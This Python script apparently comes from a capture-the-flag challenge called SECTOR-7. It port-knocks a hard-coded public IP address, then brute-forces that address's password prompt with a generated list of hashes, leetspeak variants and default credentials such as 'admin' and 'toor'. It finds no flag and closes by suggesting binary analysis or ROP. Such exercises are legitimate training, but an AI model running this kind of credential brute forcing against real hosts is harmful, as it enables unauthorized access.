#!/usr/bin/env python3
"""
FINAL COMPREHENSIVE SECTOR-7 SOLVER
"""

from pwn import *
import hashlib
import base64
import time

context.log_level = 'error'

target_ip = "13.206.58.35"
target_port = 9999

def knock():
    for p in [9000, 2600, 1337]:
        try:
            s = socket.socket()
            s.settimeout(0.2)
            s.connect((target_ip, p))
            s.close()
        except:
            pass
    time.sleep(0.3)

def try_pwd(pwd):
    try:
        knock()
        c = remote(target_ip, target_port)
        c.recvuntil(b"password:", timeout=1)
        c.sendline(pwd if isinstance(pwd, bytes) else pwd.encode())
        r = c.recvall(timeout=0.7)
        c.close()
        
        text = r.decode('utf-8', errors='ignore')
        if "kaal{" in text.lower() or ("flag" in text.lower() and "denied" not in text.lower() and len(text) > 100):
            print(f"\n[!!!] FOUND FLAG!")
            print(f"Password: {pwd}")
            print(f"Response:\n{text}")
            return True
    except:
        pass
    return False

print("[*] FINAL SECTOR-7 ATTACK")
print("[*] Generating comprehensive password list...\n")

passwords = []

# Base combinations
bases = ["KAAL", "kaal", "Kaal", "SECTOR-7", "sector7", "9000", "2600", "1337"]

# Add hashes
for b in bases:
    passwords.append(hashlib.md5(b.encode()).hexdigest())
    passwords.append(hashlib.sha1(b.encode()).hexdigest())
    passwords.append(hashlib.sha256(b.encode()).hexdigest())
    passwords.append(base64.b64encode(b.encode()).decode())

# Add combinations
for sep in ["", "-", "_", ":", "."]:
    passwords.extend([
        f"9000{sep}2600{sep}1337",
        f"KAAL{sep}9000{sep}2600{sep}1337",
        f"kaal{sep}9000{sep}2600{sep}1337",
    ])

# Cultural references
passwords.extend([
    "over9000", "9001", "vegeta", "goku", "saiyan", "dragonball",
    "2600hz", "bluebox", "redbox", "phreaker", "captaincrunch", "joebubba",
    "elite", "1337", "leet", "31337", "h4x0r", "hacker", "cracker",
    "K44L", "k44l", "K@AL", "k@al", "KA4L",
    "S3CT0R7", "s3ct0r7", "S3CTOR-7",
    "heisenberg", "knock", "knockknock",
    "password", "admin", "root", "toor", "123456",
])

# Try author name
passwords.extend(["Glitch3r", "glitch3r", "GLITCH3R", "gl1tch3r"])

# Try port combinations as passwords
passwords.extend([
    "9000", "2600", "1337", "9001", "31337", "8080", "9999",
])

# Try hex/binary representations
passwords.extend([
    hex(9000)[2:], hex(2600)[2:], hex(1337)[2:],
    hex(9000)[2:] + hex(2600)[2:] + hex(1337)[2:],
])

# Try base64 of combinations
for combo in ["9000-2600-1337", "KAAL", "sector7"]:
    passwords.append(base64.b64encode(combo.encode()).decode())

# Remove duplicates
passwords = list(set(passwords))

print(f"[*] Testing {len(passwords)} unique passwords...")

count = 0
for pwd in passwords:
    count += 1
    if count % 50 == 0:
        print(f"[*] Tested {count}/{len(passwords)}...")
    
    if try_pwd(pwd):
        exit(0)
    
    time.sleep(0.4)

print("\n[*] No flag found with password brute force")
print("[*] This challenge likely requires:")
print("    1. Binary analysis (need to download the binary first)")
print("    2. Advanced ROP/exploitation techniques")
print("    3. Or a password derivation method we haven't discovered")
